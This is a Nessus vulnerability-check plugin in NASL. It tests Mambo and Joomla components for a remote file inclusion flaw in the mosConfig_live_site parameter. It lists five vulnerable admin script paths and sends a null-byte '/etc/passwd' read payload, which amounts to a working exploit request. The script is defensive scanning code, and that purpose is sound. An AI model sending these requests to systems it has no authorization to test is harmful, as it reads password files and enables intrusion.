#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(26059);
  script_version("$Revision: 1.16 $");

  script_cve_id(
    "CVE-2007-4923",
    "CVE-2007-5309",
    "CVE-2007-5363",
    "CVE-2007-5410",
    "CVE-2007-5451"
  );
  script_bugtraq_id(25664, 25946, 25958, 25999, 26059);
  script_xref(name:"OSVDB", value:"37028");
  script_xref(name:"OSVDB", value:"38585");
  script_xref(name:"OSVDB", value:"38645");
  script_xref(name:"OSVDB", value:"40609");
  script_xref(name:"OSVDB", value:"43765");

  script_name(english:"Mambo / Joomla! Multiple Components mosConfig_live_site Parameter Remote File Inclusion");
  script_summary(english:"Tries to read a local file using Mambo / Joomla components");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is prone to
remote file include attacks." );
 script_set_attribute(attribute:"description", value:
"The remote host contains a third-party Mambo / Joomla component. 

The version of at least one such component installed on the remote
host fails to sanitize user input to the 'mosConfig_live_site'
parameter before using it to include PHP code.  Provided PHP's
'register_globals' setting is enabled, an unauthenticated attacker may
be able to exploit these flaws to view arbitrary files on the remote
host or to execute arbitrary PHP code, possibly taken from third-party
hosts." );
 script_set_attribute(attribute:"see_also", value:"http://milw0rm.com/exploits/4401" );
 script_set_attribute(attribute:"see_also", value:"http://milw0rm.com/exploits/4489" );
 script_set_attribute(attribute:"see_also", value:"http://milw0rm.com/exploits/4496" );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/481979/30/0/threaded" );
 script_set_attribute(attribute:"see_also", value:"http://milw0rm.com/exploits/4524" );
 script_set_attribute(attribute:"solution", value:
"Disable PHP's 'register_globals' setting or contact the product's
author to see if an upgrade exists." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P" );


script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2009 Tenable Network Security, Inc.");

  script_dependencies("mambo_detect.nasl", "joomla_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Vulnerable scripts.
ncoms = 0;
com = make_array();
# -   ColorLAB
com[ncoms++] = "/administrator/components/com_color/admin.color.php";
# -   Joomla!Radio
com[ncoms++] = "/administrator/components/com_joomlaradiov5/admin.joomlaradiov5.php";
# -   Panoramic
com[ncoms++] = "/administrator/components/com_panoramic/admin.panoramic.php";
# -    WmT Flash Gallery
com[ncoms++] = "/administrator/components/com_wmtgallery/admin.wmtgallery.php";
# -    WmT Flash RSS Reader
com[ncoms++] = "/administrator/components/com_wmtrssreader/admin.wmtrssreader.php";


# Generate a list of paths to check.
ndirs = 0;
# - Mambo Open Source.
install = get_kb_item(string("www/", port, "/mambo_mos"));
if (install)
{
  matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
  if (!isnull(matches))
  {
    dir = matches[2];
    dirs[ndirs++] = dir;
  }
}
# - Joomla
install = get_kb_item(string("www/", port, "/joomla"));
if (install)
{
  matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
  if (!isnull(matches))
  {
    dir = matches[2];
    dirs[ndirs++] = dir;
  }
}


# Loop through each directory.
info = "";
contents = "";
foreach dir (dirs)
{
  # Try to exploit the flaw to read a file.
  file = "/etc/passwd%00";
  for (i=0; i<ncoms; i++)
  {
    r = http_send_recv3(method:"GET", port:port,
      item:string(dir, com[i], "?", "mosConfig_live_site=", file));
    if (isnull(r)) exit(0);
    res = r[2];

    # There's a problem if...
    if (
      # there's an entry for root or...
      egrep(pattern:"root:.*:0:[01]:", string:res) ||
      # we get an error saying "failed to open stream".
      egrep(pattern:"main\(/etc/passwd\\0.+ failed to open stream", string:res) ||
      # we get an error claiming the file doesn't exist or...
      egrep(pattern:"main\(/etc/passwd\).*: failed to open stream: No such file or directory", string:res) ||
      # we get an error about open_basedir restriction.
      egrep(pattern:"main.+ open_basedir restriction in effect. File\(/etc/passwd", string:res)
    )
    {
      info = info +
             "  " + dir + com[i] + '\n';

      if (!contents && egrep(string:res, pattern:"root:.*:0:[01]:"))
        contents = res - strstr(res, "<br");

      if (!thorough_tests) break;
    }
  }
  if (info && !thorough_tests) break;
}

if (info)
{
  if (contents)
    info = string(
      info,
      "\n",
      "And here are the contents of the file '/etc/passwd' that Nessus\n",
      "was able to read from the remote host :\n",
      "\n",
      contents
    );

  if (!thorough_tests)
  {
    info = string(
      info,
      "\n",
      "Note that Nessus did not check whether there were other components\n",
      "installed that might be affected by the same issue because the \n",
      "Thorough Tests setting was not enabled when this scan was run.\n"
    );
  }

  report = string(
    "The following scripts(s) are vulnerable :\n",
    "\n",
    info
  );
  security_warning(port:port, extra:report);
}
